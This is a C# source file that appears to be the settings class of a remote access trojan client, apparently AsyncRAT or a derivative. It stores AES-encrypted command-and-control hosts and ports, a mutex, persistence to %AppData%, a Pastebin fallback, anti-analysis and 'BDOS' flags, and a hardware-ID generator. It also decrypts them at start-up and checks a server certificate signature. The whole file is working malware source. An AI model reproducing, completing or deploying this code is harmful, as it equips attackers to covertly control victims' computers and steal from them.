using System;
using System.Security.Cryptography;
using System.Security.Cryptography.X509Certificates;
using System.Text;
using Client.Algorithm;
using Client.Helper;

namespace Client;

public static class Settings
{
	public static string Ports = "267CUQoh5tqKpSTgOkY5MmxLCqc2eFQbSd/SGkUjVY3Kr8cZbJg2Nu8cLFA2724DMTcTkYHeLu2YE3iqcl9ybQ==";

	public static string Hosts = "HN/6/Ib/4WT/fydWP+gbhltnLbJpM3OcT58VmCFWQ7l4RhUck1f3Zq+Ld0t063n9zVTJH3+O+AUB7l3vhIxtQQ==";

	public static string Version = "IUOqrhMX30dyJZ4r0/gTjBOtncre5pq6yCD6713APK4MdEuh0NEwnoa6dNyO12GZpYuRGajs+lOkNKYRTQny4w==";

	public static string Install = "F29bJh4p9Gz8Xzk2pAEx7+cjS5burkgEhqy/55Fw2vDq3ei4fJAySpT4H7mreshmB4V/nb9xrqOCJK2SQEJ9PQ==";

	public static string InstallFolder = "%AppData%";

	public static string InstallFile = "";

	public static string Key = "RTA1M2JkdzFvMU14WndMRG5mUTFWRm45VHZtVXhnQ3I=";

	public static string MTX = "OxiNmOU3oQ+p8G51aDVa8pbn8yB9BVQoaOtNkOLwFomtv5d2mkrZLexmSAWNYLic10Bwe+x1l5SgQIic2wEfUaqEqAXC+uuZNoHikpz3T1o=";

	public static string Certificate = "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";

	public static string Serversignature = "StWoyX5INTrSjeaP6dp99Y1Vg/dz5a4CERfEABiOwU2pR7w5f+tgYEET4oSnVKHq9Dy5oskSzWLCckin2l5SJqfw+CLWN/3lsFO0H/2Nl0veSIJ5B4UmDFFInjeVfuql1T0arMycvZtDt6pDtbKvYhYtphKJY+bzMqbt0WQg/gQLx6KxIZs+DgILLrs7m6hSrtqNMXXAriRHB92LmdpN3LcWR3iEPsjM7Zb2OSe0w99SzdLVJjybTMqEKPx7vML5Xy7G3IBc1zkNpL/8JdSPut8f+Ak/95UyhmGynDaDtyROubfSIuKlCqzaSUowW/p8z8eKSxa0PhjjI7oIYht0mvrPXCD/q3Y3+O5c/m22Tz5IVmDSi5hIyLf7QXdlqOdcN/z+avi4tJVQhysA7AgrFJ35ApKuZY5zXHdZBVIwKQNHKZdCkSRVLbWQxMxcOTTSOlHnH1/KYQlBzqSyL5h6fFEW170FFt7+edwrxj0ajmjRdnZ2a2TeleKHp82kKRhpvvBQuTz0nIA+kDeYZf6vmFprarzE3dog3H9a5v9BPjpAPQa5sSzVSCvOvot7Lf2zOKxuM4IjPiIPiTaHiEhRrur9+DMcganuBZD+IZ0+WGtX1cem64x7wtFGgAv6m3aPwzm+RZLhBtK64FDVgdsRZG8wGQMjrH7H8TvPWpJVTNHYmfr2EylQoTJYG5qOL9CJZoHjb3STRHDjOq+NIXd5kfpL849v4kp0g4U+NNrDJx2p9PRnfuc1BxNzAp7VxRgFfW6S6BNAkSClhL8hRqDqwCw4bFlCiBoc2qOxzTxTh9/lAVRyARucak0ueZ6bCrdpvGGEIdKScyCm00xZ5H62L6EW40yLVH8cRdxpD5hgwOoOoTHY6QJ1tKEsVyOoRR1kn/lHzzYl7IGIC75cFg3jHFu7ItHM1qD3YHvo5nW2A9G96DZ4dqupAP3v8KYSBubwvoVBM6yqZqj+sDjY+swkpQ==";

	public static X509Certificate2 ServerCertificate;

	public static string Anti = "gWF9l5kthcc/vkthMPlmTkahWikWDKNG1sULf1JBYFwHQnymi5BEZO9M+RgSvtWh+6TZVVyHFthjlvuguJxCCw==";

	public static Aes256 aes256;

	public static string Pastebin = "yeJ8RTszi8r4Zz9+3nk20i8AXCNBugpGHQaBfu54J4g8LkubQIQ5He9He9NE/Hlu76fqkq/OSDPGHWQzDGUmCQ==";

	public static string BDOS = "IKuhPyexUtN+XKK3Vp8uZMWsvVH3L1tG+C87wjHZvzQ7vFmC0nF4DH6k3oqbXVwMQ/taJe4emeCjAmX4x7D5zw==";

	public static string Hwid = null;

	public static string Delay = "3";

	public static string Group = "WwPEvcP/R67W700bY6r2+AnoPxZJ0hWP0FZrvLMuOEEMTabkTvtaFP5J38tuKjHLh6ZYU1c3tbN883Qnt8YnHA==";

	public static bool InitializeSettings()
	{
		try
		{
			Key = Encoding.UTF8.GetString(Convert.FromBase64String(Key));
			aes256 = new Aes256(Key);
			Ports = aes256.Decrypt(Ports);
			Hosts = aes256.Decrypt(Hosts);
			Version = aes256.Decrypt(Version);
			Install = aes256.Decrypt(Install);
			MTX = aes256.Decrypt(MTX);
			Pastebin = aes256.Decrypt(Pastebin);
			Anti = aes256.Decrypt(Anti);
			BDOS = aes256.Decrypt(BDOS);
			Group = aes256.Decrypt(Group);
			Hwid = HwidGen.HWID();
			Serversignature = aes256.Decrypt(Serversignature);
			ServerCertificate = new X509Certificate2(Convert.FromBase64String(aes256.Decrypt(Certificate)));
			return VerifyHash();
		}
		catch
		{
			return false;
		}
	}

	private static bool VerifyHash()
	{
		try
		{
			return ((RSACryptoServiceProvider)ServerCertificate.PublicKey.Key).VerifyHash(Sha256.ComputeHash(Encoding.UTF8.GetBytes(Key)), CryptoConfig.MapNameToOID("SHA256"), Convert.FromBase64String(Serversignature));
		}
		catch (Exception)
		{
			return false;
		}
	}
}
